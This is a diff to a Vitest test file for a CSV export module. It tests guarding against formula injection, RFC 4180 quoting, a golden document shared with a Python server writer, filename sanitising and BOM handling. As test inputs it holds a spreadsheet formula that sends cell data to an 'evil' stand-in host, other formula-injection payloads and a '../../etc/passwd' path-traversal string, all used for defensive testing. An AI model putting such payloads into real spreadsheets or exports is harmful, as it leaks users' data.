@@ -7,6 +7,7 @@
 import { describe, expect, it, vi } from "vitest";
 import {
   buildCsv,
+  csvBlobParts,
   csvCell,
   downloadCsv,
   exportColumns,
@@ -66,9 +67,45 @@ describe("csvCell — RFC 4180 quoting", () => {
     expect(csvCell('=HYPERLINK("http://evil/"+A1)')).toBe('"\'=HYPERLINK(""http://evil/""+A1)"');
     expect(csvCell("+cmd")).toBe("'+cmd");
     expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
-    expect(csvCell("-5")).toBe("'-5"); // a string that looks like a formula lead
     expect(csvCell(-5)).toBe("-5"); // a number is a number
     expect(csvCell("normal - dash")).toBe("normal - dash");
+  });
+
+  it("keys the guard on the SHAPE of the text, not on the JS type", () => {
+    // DRF answers a DecimalField as a STRING, so "-5.00" is data here and the
+    // server writer sees a Decimal. Both sides exempt numeric-shaped text,
+    // otherwise the two export buttons disagree on every negative price.
+    // Layer note: this csvCell also quotes (Python splits guard -> csv_cell and
+    // quote -> csv_text), so a comma-bearing cell shows the quoting here only.
+    expect(csvCell("-5.00")).toBe("-5.00");
+    expect(csvCell("+19.99")).toBe("+19.99");
+    expect(csvCell("-.5")).toBe("-.5");
+    expect(csvCell("-7,25")).toBe('"\'-7,25"'); // a comma is not a number, so guarded + quoted
+    expect(csvCell("-2+3")).toBe("'-2+3"); // the classic payload
+    expect(csvCell("-IF(1,2,3)")).toBe('"\'-IF(1,2,3)"');
+    expect(csvCell("-")).toBe("'-"); // a lone lead character is not a number
+  });
+});
+
+describe("the shared golden document — same bytes as the server writer", () => {
+  it("reproduces plugin/tests/test_csv_export.py::test_the_shared_golden_document", () => {
+    // The literal is asserted twice, in two languages, over the same values.
+    // Python builds it with csv_text([header] + [[csv_cell(v) …]]); this side
+    // with buildCsv(). If one writer drifts, that suite goes red and names it.
+    const header = ["id", "name", "notes", "active", "total", "when"];
+    const rows = [
+      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00"],
+      [2, "Gizmo, big", 'say "hi"', false, "-5.00", null],
+      [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', true, "-7.25",
+       "2026-10-20T21:00:00"],
+    ];
+    expect(buildCsv(header, rows)).toBe(
+      "id,name,notes,active,total,when\r\n" +
+      "1,Widget,plain,true,19.99,2026-10-20T21:00:00\r\n" +
+      '2,"Gizmo, big","say ""hi""",false,-5.00,\r\n' +
+      "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\"," +
+      "true,-7.25,2026-10-20T21:00:00\r\n",
+    );
   });
 });
 
@@ -123,6 +160,21 @@ describe("exportFileName", () => {
     expect(exportFileName("../../etc/passwd")).toBe("etc-passwd.csv");
     expect(exportFileName("")).toBe("export.csv");
     expect(exportFileName("   ")).toBe("export.csv");
+  });
+});
+
+describe("csvBlobParts — exactly one BOM", () => {
+  it("adds the BOM to a client-written document", () => {
+    expect(csvBlobParts("id\r\n1\r\n")).toEqual(["﻿id\r\n1\r\n"]);
+  });
+
+  it("does not double the BOM the server already wrote", () => {
+    // Layer 2 downloads the endpoint's own bytes, which start with U+FEFF by
+    // contract (test_csv_export.py asserts it). Prepending again puts a second
+    // BOM in the file, and Excel shows it as "ï»¿id" in the first header cell.
+    const fromServer = "﻿id\r\n1\r\n";
+    expect(csvBlobParts(fromServer)).toEqual(["﻿id\r\n1\r\n"]);
+    expect(csvBlobParts(csvBlobParts(fromServer)[0] as string)).toEqual(["﻿id\r\n1\r\n"]);
   });
 });
 
